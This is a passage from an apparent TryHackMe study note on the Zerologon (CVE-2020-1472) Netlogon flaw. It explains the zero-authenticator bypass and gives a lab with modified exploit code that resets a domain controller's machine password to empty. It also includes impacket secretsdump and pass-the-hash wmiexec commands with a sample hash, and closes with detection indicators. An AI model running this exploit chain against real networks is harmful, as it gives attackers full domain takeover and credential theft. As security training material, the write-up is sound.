times until we hit a key \u0026 authentication succeeds\n2. Disabling signing \u0026 sealing\n\t- ok we can bypass the auth call, but we still have no idea what the value of the session key is\n\t- it becomess problematic due to Netlogon'ss transport encryption mechanism *(RPC signing \u0026 sealing)*, which uses this key but a different scheme than `ComputeNetlogonCredential`\n\t- luckily, signing \u0026 sealing is optional =\u003e so we can simply omit the flag in the `NetrServerAuthenticate3` call \u0026 continue\n3. Spoofing a call\n\t- even when encryption is disabled, every call must contain a so-called `authenticator` value which is computed by applying `ComputeNetlogonCredential(w session key)` to the `ClientStoredCredential + Timestamp`\n\t\t- `ClientStoredCredential`: incrementing value maintained by the client \u0026 intialised to the same value as the `ClientCredential` we provided =\u003e will be 0\n\t\t- `Timestamp`: the current Posix time; server doesn't place many restriction on this value =\u003e simply pretend that it‚Äôs January 1st, 1970 = 0\n\t- `ComputeNetlogonCredential(0) = 0` =\u003e we can authenticate our first call by simply providing an all-zero authenticator \u0026 timestamp\n4. Changing computer's AD password\n\t- we can leverage the `NetrServerPasswordSet2` call to set a new password for the client\n\t\t- password is not hashed but it is encrypted with the session key by using again `CFB8` with an all-zero IV\n\t- plaintext password structure in the Netlogon protocol consists of 516 bytes *(last 4 being the pass len)*\n\t- provide 516 zeroes =\u003e decryption to 516 zeroes =\u003e zero-length password *(setting empty passwords for a computer is not forbidden)* =\u003e can set an empty password for any computer in the domain\n\t- afterwards, we can simply set up a new Netlogon connection on behalf of this computer\n\t\u003e **NOTE**: When changing a computer password in this way it is only changed in the AD. The targeted system itself will still locally store its original password.\n5. From pass change to domain admin\n\n### Lab\n- **Perequistes**\n\t- check out the [POC released by secura](https://github.com/SecuraBV/CVE-2020-1472)\n\t- install [impacket](https://github.com/SecureAuthCorp/impacket):\n\t\t```bash\n\t\tpython3 -m pip install virtualenv\n\t\tpython3 -m virtualenv impacketEnv  \n\t\tsource impacketEnv/bin/activate\n\t\tpip install git+https://github.com/SecureAuthCorp/impacket\n\t\t```\n\t- setup a local Domain Name Controller *([THM zer0logon room](https://tryhackme.com/room/zer0logon))*\n- Modify `zerologon_tester.py` to reset the domain controller password \u0026 run it: `python zerologon_tester.py DC01 10.10.45.187`\n\t```python\n\t...\n\t\n\tdef build_new_pass_req(dc_handle, target_computer):\n    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81\n    newPassRequest = nrpc.NetrServerPasswordSet2()\n    newPassRequest['PrimaryName'] = dc_handle + '\\x00'\n    newPassRequest['AccountName'] = target_computer + '$\\x00'\n    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel\n    newPassRequest['ComputerName'] = target_computer + '\\x00'\n\n    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab\n    auth = nrpc.NETLOGON_AUTHENTICATOR()\n    auth['Credential'] = b'\\x00' * 8\n    auth['Timestamp']  = b'\\x00' * 4\n    newPassRequest['Authenticator'] = auth\n\n    # consists of 516 bytes of random padding: junk + password + length of pass (last 4 bytes)\n    newPassRequest['ClearNewPassword'] = b'\\x00' * 516\n    return newPassRequest\n\n\tdef try_zero_authenticate(dc_handle, dc_ip, target_computer):\n\t\t...\n\t\t\n\t\t# It worked!\n    \tassert server_auth['ErrorCode'] == 0\n    \tserver_auth.dump()\n    \tprint(f\"server challenge {serverChall}\")\n\n    \ttry:\n        \t# Trigger password reset\n        \tprint(f\"Attempting password reset on {target_computer}...\")\n\t\t\tnewPassReq = build_new_pass_req(dc_handle, target_computer)\n\t\t\tres        = rpc_con.request(newPassReq)\n\t\t\tres.dump()\n\t\texcept Exception as e:\n        \tprint(e)\n\t\treturn rpc_con\n\n\t...\n\t```\n- Dump hashes with [impacket's secretsdump.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/secretsdump.py): `python secretsdump.py -just-dc HOLOLIVE/DC01\\$@10.10.45.187`\n- Pop shell w [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) by passing the hash: `python wmiexec.py HOLOLIVE/Administrator@10.10.45.187 -hashes aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568`\n\n## Packet Analysis\nTODO\n\n## Mitigation \u0026 Detection\n\n- many tries to authenticate unssuccessfully\n- zero key stream in auth netlogon pkgs\n- ssign \u0026 sseal flags are disabled\n- timesstamp in auth value is 0\n- choosing cipher suite of AES-CFB8\n\nwirehark rule to detect it *(based on timestamp, negotiation opts, challenge \u0026 iv?)*\n\n---\n\n## References\n- [Zerologon (CVE-2020-1472): An Unauthenticated Privilege Escalation to Full Domain Privileges](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/)\n- [Zerologon Attack Explained Technical - CVE-2020-1472](https://www.youtube.com/watch?v=EzVmGQr2IFw)\n- [Whitepaper: secura](https://www.secura.com/uploads/whitepapers/Zerologon.pdf)\n\n## See Also\n- [[write-ups/thm/core-windows-processes]]\n- [[write-ups/THM]]\n","lastmodified":"2022-09-07T18:56:29.175584279Z","tags":null}}